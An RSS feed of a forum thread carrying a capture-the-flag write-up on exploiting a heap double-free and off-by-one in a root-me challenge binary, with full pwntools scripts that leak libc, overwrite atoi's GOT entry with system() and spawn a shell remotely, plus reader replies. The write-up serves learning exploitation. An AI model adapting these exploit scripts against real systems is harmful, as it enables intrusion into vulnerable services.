<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Heap Exploitation | Playing with chunks!</title>
    <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055</link>
    <description>###Solving a Heap exploitation challenge :smiley:
In the name of Allah, the most beneficent, the most merciful.

----------

- Thanks to @_py and @n0tnu11  who encouraged me, to write about such thing..
- I want to say sorry, cause i don&#39;t write alot more articles, you know guys, studies :sweat:.. 
- It wasn&#39;t easy for me to solve this challenge, took me alot of testing, almost two days.
- Hello everyone to this article..

- For learning purposes :)
- Challenge is only solved by 35, was 26 when i finished it!


Before we start, let&#39;s take a look at the informations given on the binary and what kind of protections are ON..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png&quot; width=&quot;690&quot; height=&quot;141&quot;&gt;

Oh yeah, the following protections are ON:
&gt;ASLR
NX
SSP
PARTIAL RELRO

Awesome, a perfect target, to start our heap exploitation adventure!
We have also, the source code, and the binary is given!

- Better find a music to listen to:
- I will listen to [this](https://www.youtube.com/watch?v=JgJ4g90u2V8)!

Awesome, let me first run my VM machine, and then download the binary from the server!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c85d994691de0247a47988f1b5d38a6c1d1b5060.png&quot; width=&quot;690&quot; height=&quot;195&quot;&gt;

Great, we now, should take a look at the source given, and try to make a plan for the attack..
We have 3 functions that seem important:

- creation() to allocate..
- change() to edit..
- delete() to free..
- show() to show information..

Awesome, so now let&#39;s take a look at the functions.. :yum:

```c
struct entry *creation() {
    char name[64];
    struct entry *e;
 
    e = (struct entry *) malloc(sizeof(struct entry));
 
    printf(&quot;Name: &quot;);
    fgets(name, NAME_LEN_MAX, stdin);
    name[strlen(name)-1] = 0;
    e-&gt;name = malloc(strlen(name));
    strcpy(e-&gt;name, name);
 
    printf(&quot;Age: &quot;);
    fgets(name,6,stdin);
    e-&gt;age = atoi(name);
 
    return e;
}
```
Uhmm, it will allocate 2 chunks, one built on the struct of entry..
Keep in mind that the struct of entry looks like this:
```c
struct entry {
  int age;
  char *name;
};
```
- So, in the first allocated chunk there will be stored the age, and a pointer to next chunk, where name will be stored!

Great!
Now let&#39;s see the delete function!
```c
void delete(int i) {
    free(directory[i]-&gt;name);
    free(directory[i]);
}
```
- It will free the chunk containing the age and pointer to name, and the next chunk that contains the name!

The show() function:
```c
void show(int i) {
    printf(&quot;[%d] %s, %d years old\n&quot;, i, directory[i]-&gt;name, directory[i]-&gt;age);
}
```
- Seems like it will print information about one chunk we choose!
- May lead to some kind of leak, if we controlled the *name..

And the change() function!
```c
void change(int e) {
    char name[64];
 
    printf(&quot;New name: &quot;);
    fgets(name, strlen(directory[e]-&gt;name)+1, stdin);
 
    name[strlen(name)] = 0;
    strcpy(directory[e]-&gt;name, name);
    printf(&quot;New age: &quot;);
    fgets(name, 6, stdin);
    directory[e]-&gt;age = atoi(name);
}
```
- It will strcpy our first input to directory[e]-&gt;name, and the second input will be put in age!
- There&#39;s seems to be an offbyone bug there, may allow us to change the size of the next chunk..
- We can overwrite arbitrary address if we controlled *name..

Questions that come to our head now!

- How can we overwrite the *name?

Well, this is the real problem, we should become creative..
Let&#39;s start the program, and start analysing memory!

When we start it, we get this menu..
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e148cc032808ec0f7a142ddfbf8e7b8ed4fe4c8e.png&quot; width=&quot;341&quot; height=&quot;221&quot;&gt;

Let&#39;s start it again, but this time, using GDB, to analyse memory, and see our chunks..

- gdb ch44 -q

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6b77c48d0972450d5e7a6eedd62094856d9541b8.png&quot; width=&quot;408&quot; height=&quot;239&quot;&gt;

Awesome, let&#39;s now create a new entry!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/93e84fdab3f7f29e0b4a2f7cd9f9ac25225a6706.png&quot; width=&quot;169&quot; height=&quot;104&quot;&gt;

Great, now let&#39;s take a look at memory, we will look at &amp;directory!

- Ctrl + C to interrupt the execution and write c in gdb so it continues executing again!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/751cded05b2260fc2855ab10bf085710804190f1.png&quot; width=&quot;382&quot; height=&quot;36&quot;&gt;

Alright, let&#39;s see &amp;directory!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c1747097d6f06c9adfd74dbeb2ebcf2900cf78bc.png&quot; width=&quot;672&quot; height=&quot;112&quot;&gt;

Awesome, so the first entry is here: 0x605010!
Let&#39;s take a look at what&#39;s in this area!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/63d2639d040bfb15e3ec773d279dc49b88374edb.png&quot; width=&quot;527&quot; height=&quot;113&quot;&gt;

Great!
The structure of the chunk looks like as we said before!
( size + age + *name + prev_size + size + name + junk.. + wilderness )

Awesome, let&#39;s start writing the functions in our exploit.py
```py
#!/usr/bin/python
from pwn import *

# PROCESS
c = process(&quot;./ch44&quot;)

# FUNCTIONS
def allocate( nm, age ):
	c.sendline(&#39;1&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( nm )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
def free( id ):
	c.sendline(&#39;2&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;&gt;&#39;)
def view( id ):
	c.sendline(&#39;4&#39;)
	c.recvuntil(&#39;[&#39; + str(id) + &#39;] &#39;)
	name = c.recvuntil(&#39;, &#39;)[:-2]
	age = c.recvuntil(&#39; years&#39;)[:-6]
	c.recvuntil(&#39;&gt;&#39;)
	return name, age
def edit( id, name, age ):
	c.sendline(&#39;3&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(id) )
	c.recvuntil(&#39;: &#39;)
	c.sendline( name )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
# ATTACH
pause()

# EXPLOIT


# INTERACTIVE
c.interactive()
```

Seems awesome, now we can start writing our exploit!

- We will mostly modify the EXPLOIT part ;)

let&#39;s start by allocating some chunks, let&#39;s say 4 chunks..
What size of each chunk will we choose ?

- After analysing a bit and trying different chunk sizes, i&#39;ll choose 56, cause we can control all the chunk with that size, allowing us to overwrite the next chunk size with the offbyone we saw before!

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )
allocate( &#39;D&#39;*56, 15 )
```

Let&#39;s run the exploit now, and attach it to GDB!
&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c3a0055c6c0f5ceb594f8d9e48128ee8a8bae14c.png&quot; width=&quot;690&quot; height=&quot;332&quot;&gt;

- Now, we should write continue ( c ) in gdb and then press enter in the other terminal, where the exploit.py is running ( pause() )!
- After doing that, the four chunks will be allocated, and we will use CTRL + C in gdb again and then examine them in memory!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/a/a3eb3871e4b9a8eb372b559022fc750393ad8dc9.png&quot; width=&quot;527&quot; height=&quot;378&quot;&gt;

Great, all seems working just great!
What if we now free some chunks what will happen?

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )
allocate( &#39;D&#39;*56, 15 )
free(2)
free(1)
```

- Alright let&#39;s run the exploit again, and see how the chunks look like now!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/4a60bcefc820e9e4655f78827f8790b70b59516b.png&quot; width=&quot;525&quot; height=&quot;377&quot;&gt;

- We can see that the FD of chunk 1 was set to the prev_size of chunk 2..
- So now, what do we have?
- We have 4 free chunks.. let&#39;s try and allocate something that will fit the chunk with 0x21 in size..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/3/3997768af33f23ce7e278227f377993937ca950f.png&quot; width=&quot;531&quot; height=&quot;112&quot;&gt;

- HELL YEAH!
- So, this maybe can help us, but not in this situation..
- Cause chunk 1 entry looks like this:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/4/43a9c0fdd7999db8ad413be2b15904115d6a3c8b.png&quot; width=&quot;534&quot; height=&quot;35&quot;&gt;

- Where 0x20690d0 is where chunk 2 entry starts..
- Then it&#39;s considered as a name..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/9/9ef357056212b79082c93a148dc06c5edb64a54b.png&quot; width=&quot;686&quot; height=&quot;80&quot;&gt;

- Keep this in mind, it may help us later..
- And since this way won&#39;t help us alot now, let&#39;s try and become more creative..
- When we free a chunk, it will be placed in a free_list, then when we allocate a chunk it will placed there if the size fits it!

&gt;
`So when we free chunk 1 then chunk 2
Free_list will look like this : `
+-------------------------+-------------------------+
+ ////////CHUNK1/////// + ////////CHUNK2/////// +
+-------------------------+-------------------------+
`Then, when the next allocation happens, the first chunk to be filled is the last free()&#39;d which is chunk2..` 

But what if we free&#39;d chunk2 two times, if we did it directly a crash occurs!

- We can free chunk2 then chunk1 then chunk2 again, and this will prevent the crash from happening ( double free )...
- And free_list will look like this.. chunk2 -&gt; chunk1 -&gt; NULL

Awesome, let&#39;s try that!
```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )
allocate( &#39;D&#39;*56, 15 )

free(2)
free(1)
free(2)
```

And it worked, what if allocated another chunk of same size ( 56 ) now ?
```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )
allocate( &#39;D&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;E&#39;*56, 15 )
```

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/7/7409a54b4fbb0b4db430bbc1f0489905c5330c83.png&quot; width=&quot;682&quot; height=&quot;72&quot;&gt;

- Uhmm, everything seems normal, let&#39;s examine memory and see how &amp;directory looks like!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/5/51605da5c0dcb1e9ed15759218657c92a9cd8770.png&quot; width=&quot;690&quot; height=&quot;53&quot;&gt;

- Oh yeah, so we got two different index in directory that point to the same to the same area!
- So, if we free()&#39;d one of them, we will have some kind of heapleak..
- We will try free()&#39;ing chunk2 since it&#39;s the last one that got filled and chunk1 is now on top of free_list, free()&#39;ing it will result in a crash!
- Oh no! we ended up in a crash while freeing both, let&#39;s try changing the exploit a bit to fit that!

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
```
- Now that, seems just PERFECT!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/2/2176badcbef1465ca610e81b8e2780f4bcb7face.png&quot; width=&quot;681&quot; height=&quot;221&quot;&gt;

- And here we gooo!
- We got a heap_leak, but that&#39;s not what we are looking for, we should get a libc_leak!
- Remember the bug we found but didn&#39;t use, that let us overwrite the *name, we&#39;ll try using it now..
- We got to find a way to overwrite the *name of a chunk that&#39;s in-use!

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)

allocate( &#39;A&#39;*16, 15 )
```
- Nothing happens here, so let&#39;s free chunk 0, and allocate twice..

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*16, 15 )
allocate( &#39;A&#39;*16, 15 )
```
- What, we got sigsegv when we tried to print entries!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6915266130fcd71c03fdce5a2baec48f050c8ccc.png&quot; width=&quot;378&quot; height=&quot;61&quot;&gt;

- Seems weird, the first guess is that it tried reading from address 0x4141414141414141.
- Which is overwritten name pointer in chunk2!
- Let&#39;s examine in GDB to make sure!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f2df79a19bb86d553b5811240d24d81a504047f8.png&quot; width=&quot;642&quot; height=&quot;188&quot;&gt;

- And yeah, it treated the AAAAAAAA as a PTR!
- Let&#39;s see now what we can do!
- We will add a part in exploit.py!

```py
# ENTRIES
free_got = 0x602018
```
We will also write a little function to return the address in littleendian.. since p64() didn&#39;t put the address correctly in this example..
```py
def revaddr(addr):
	h = hex(addr)[2:]
	t = &quot;&quot;
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t
```

And then let&#39;s comeback to exploit part and edit our exploit making the *name point to free_got!

```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(free_got), 15 )
```

- Awesome, now let&#39;s try showing entries! :smiley:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/f/f870367725ea1062be501189966d37a805012724.png&quot; width=&quot;375&quot; height=&quot;76&quot;&gt; 

- Perfect, now we got a libc_leak!
- We are going to use view() function to store the leak!
```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(free_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, &#39;\x00&#39;))
print &#39;free() @ &#39; + hex(leak)
```

- I prefer changing atoi_got since it&#39;s an easier and more guaranteed way to get shell!
```c
int choice(int min, int max, char * chaine) {
    int i;
    char buf[6];
    i = -1;
    while( (i &lt; min) || (i &gt; max)) {
        printf(&quot;%s&quot;, chaine);
        fgets(buf, 5, stdin);
        i = atoi(buf); // HERE
    }
    return i ;
}
```

- Great, now we know where atoi actually is, let&#39;s calculate where libc_base will be!
- I&#39;ll use GDB!
- Using vmmap i got libc_base, and we leaked the address of atoi_got!
- Let&#39;s calculate atoi_got - libc_base and system - libc_base!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/64822c837451b6f78ae9caed3603e7b5bb7907c6.png&quot; width=&quot;690&quot; height=&quot;276&quot;&gt;

- Great, let&#39;s create a new part in exploit.py
```py
# DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460
```
Let&#39;s now make use of them in the exploit part!
```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, &#39;\x00&#39;))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print &#39;libc_base @ &#39; + hex(libc_base)
print &#39;system() @&#39; + hex(system)
```
- Let&#39;s test the exploit and see where we going!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/b/b51ba7bddc047b528678ce14f58a026f4accee3d.png&quot; width=&quot;405&quot; height=&quot;183&quot;&gt;

- Great! now, let&#39;s use the change() function that we spoke about, and change the content of atoi_got to system!
- So in the end the exploit part will become the following!
```py
# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, &#39;\x00&#39;))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print &#39;libc_base @ &#39; + hex(libc_base)
print &#39;system() @&#39; + hex(system)

edit( 1, p64(system), &#39;sh\x00&#39; )
```
- Alright let&#39;s run the exploit now!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/e01621bad284375c9bb061d458ca51d2f1a1e551.png&quot; width=&quot;414&quot; height=&quot;146&quot;&gt;

- Awesome, we got our shell, but that&#39;s in local only..
- Let&#39;s first collect all parts in our current exploit.py!
```py
#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# PROCESS
c = process(&quot;./ch44&quot;)

# DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460

# FUNCTIONS
def allocate( nm, age ):
	c.sendline(&#39;1&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( nm )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
def free( id ):
	c.sendline(&#39;2&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;&gt;&#39;)
def view( id ):
	c.sendline(&#39;4&#39;)
	c.recvuntil(&#39;[&#39; + str(id) + &#39;] &#39;)
	name = c.recvuntil(&#39;, &#39;)[:-2]
	age = c.recvuntil(&#39; years&#39;)[:-6]
	c.recvuntil(&#39;&gt;&#39;)
	return name, age
def edit( id, name, age ):
	c.sendline(&#39;3&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(id) )
	c.recvuntil(&#39;: &#39;)
	c.sendline( name )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
def revaddr(addr):
	h = hex(addr)[2:]
	t = &quot;&quot;
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, &#39;\x00&#39;))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print &#39;libc_base @ &#39; + hex(libc_base)
print &#39;system() @&#39; + hex(system)

edit( 1, p64(system), &#39;sh\x00&#39; )

# INTERACTIVE
c.interactive()
```

- Let&#39;s connect to the server and see the libc used!
- We&#39;ll run the program using gdb then break using CTRL + C then:

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/cc4de18358aa5f2c4b6d0ca27fba8c4d5dbb6fe5.png&quot; width=&quot;677&quot; height=&quot;64&quot;&gt;

- So the libc is located at : /lib/x86_64-linux-gnu/libc.so.6
- I&#39;ll download it, and i&#39;ll use libcdatabase tool:

https://github.com/niklasb/libc-database

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/1/1077aebe71c5e82a64d6c26a3fcda957553d430c.png&quot; width=&quot;690&quot; height=&quot;124&quot;&gt;

- then we&#39;ll use libcdatabase -&gt; ./add libc.so.6

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/e/ea7c0079d24f3aadb6f8eab854ed2bc2e968764a.png&quot; width=&quot;690&quot; height=&quot;242&quot;&gt;

- We got everything we need, except atoi!

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/c/c17a63a660a7b94444fa13057bdb88ce20506725.png&quot; width=&quot;690&quot; height=&quot;56&quot;&gt;

- We will now edit a part in exploit.py!
```py
# DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590
```
- And we will also set c to remote!
```py
# REMOTE
c = remote( &#39;challenge03.root-me.org&#39;, 56544 )
```
- The full exploit now looks like this:
```py
#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# REMOTE
c = remote( &#39;challenge03.root-me.org&#39;, 56544 )

# DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590

# FUNCTIONS
def allocate( nm, age ):
	c.sendline(&#39;1&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( nm )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
def free( id ):
	c.sendline(&#39;2&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline(str(id))
	c.recvuntil(&#39;&gt;&#39;)
def view( id ):
	c.sendline(&#39;4&#39;)
	c.recvuntil(&#39;[&#39; + str(id) + &#39;] &#39;)
	name = c.recvuntil(&#39;, &#39;)[:-2]
	age = c.recvuntil(&#39; years&#39;)[:-6]
	c.recvuntil(&#39;&gt;&#39;)
	return name, age
def edit( id, name, age ):
	c.sendline(&#39;3&#39;)
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(id) )
	c.recvuntil(&#39;: &#39;)
	c.sendline( name )
	c.recvuntil(&#39;: &#39;)
	c.sendline( str(age) )
	c.recvuntil(&#39;&gt;&#39;)
def revaddr(addr):
	h = hex(addr)[2:]
	t = &quot;&quot;
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( &#39;A&#39;*56, 15 )
allocate( &#39;B&#39;*56, 15 )
allocate( &#39;C&#39;*56, 15 )

free(2)
free(1)
free(2)

allocate( &#39;D&#39;*56, 15 )

free(2)
free(0)

allocate( &#39;A&#39;*8, 15 )
allocate( &#39;A&#39;*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, &#39;\x00&#39;))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print &#39;libc_base @ &#39; + hex(libc_base)
print &#39;system() @&#39; + hex(system)

edit( 1, p64(system), &#39;sh\x00&#39; )

# INTERACTIVE
c.interactive()
```

- Let&#39;s now run the exploit and see the result..

&lt;img src=&quot;//0x00sec.s3.amazonaws.com/original/2X/6/6a88b96bad34519080cd2acaaf554f97cd43a26a.png&quot; width=&quot;690&quot; height=&quot;162&quot;&gt;

- And we got our shell!
- Hope you enjoyed, and learned too! :)
- See you all in next article :smiley:

~ exploit</description>
    
    <lastBuildDate>Fri, 09 Apr 2021 07:41:38 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[IdanBanani]]></dc:creator>
        <description><![CDATA[
            <p>Too bad the images are dead.<br>
Currently, for some reason - the binary running on the server (When you make a TCP connection to it like in here) is using/loading/linked against a newer (2018) version of glibc , so Tcache is enabled and has double free mitigation (goes through the whole cache) and you need to do some kind of tcache poisionning to overcome it.</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/8">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/8</link>
        <pubDate>Fri, 09 Apr 2021 07:41:38 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-8</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>Thank you *_* <img src="https://0x00sec.org/images/emoji/twitter/smile.png?v=9" title=":smile:" class="emoji" alt=":smile:"></p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/7">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/7</link>
        <pubDate>Wed, 09 Aug 2017 13:12:09 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-7</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[BlahCat007]]></dc:creator>
        <description><![CDATA[
            <p>Supa Hot fire , I like your articles , detailed info and helpful keep going</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/6</link>
        <pubDate>Wed, 09 Aug 2017 13:04:49 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-6</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <ul>
<li>We didn’t change the saved RIP like the last article <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> !</li>
<li>This time we went more creative by changing a GOT entry, making it point to calculated system() !</li>
<li>Then using that to pop a shell <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:">
</li>
<li>We changed atoi_got to calculated system() address, then knowing where atoi() is used, by viewing the source:</li>
</ul>
<pre><code class="lang-auto">int choice(int min, int max, char * chaine) {
    int i;
    char buf[6];
    i = -1;
    while( (i &lt; min) || (i &gt; max)) {
        printf("%s", chaine);
        fgets(buf, 5, stdin);
        i = atoi(buf); // HERE
    }
    return i ;
}
</code></pre>
<ul>
<li>So, when we input our choice, atoi() is called on the userinput, well if we set atoi() to system() it will be:</li>
<li>system(buf), and that will lead to a shell, if the input is “sh\x00” <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> !</li>
</ul>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/5</link>
        <pubDate>Thu, 18 May 2017 23:03:51 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-5</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
        <description><![CDATA[
            <p>Ah, that makes much more sense. Another question: How did you find the EIP? I am assuming that is the pointer you overwrote. Was it just trial and error?</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/4</link>
        <pubDate>Thu, 18 May 2017 22:57:01 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-4</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <ul>
<li>The goal of using that tool was getting the address of system(), knowing that libc file is provided !</li>
<li>Also sometimes, the libc file isn’t provided, so a website is used, which is: <a href="http://libcdb.com" rel="noopener nofollow ugc">libcdb.com</a>! ( will be discussed maybe later <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"> )</li>
<li>Only the libc_base is randomized, the differences stay the same! <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
<li>the thing you should now is: if you know the address of a function in libc, and keep in mind that difference between addresses in libc doesn’t change, but stays the same, you can calculate it!</li>
<li>But to do so, you should have the differences, that’s why i used libcdatabase, to help me get libc_base, by substracting the diff of the leaked function’s address from the leaked address!</li>
<li>And then adding the system_diff to the result of substraction, that would get system() address in libc!</li>
</ul>
<blockquote>
<p>Conclusion : if you have the libc, you can get the difference of every libc function from libc_base and then calculate the address of system() or whatever you want in libc easily! <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></p>
</blockquote>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/3</link>
        <pubDate>Thu, 18 May 2017 22:46:25 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-3</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[pry0cc]]></dc:creator>
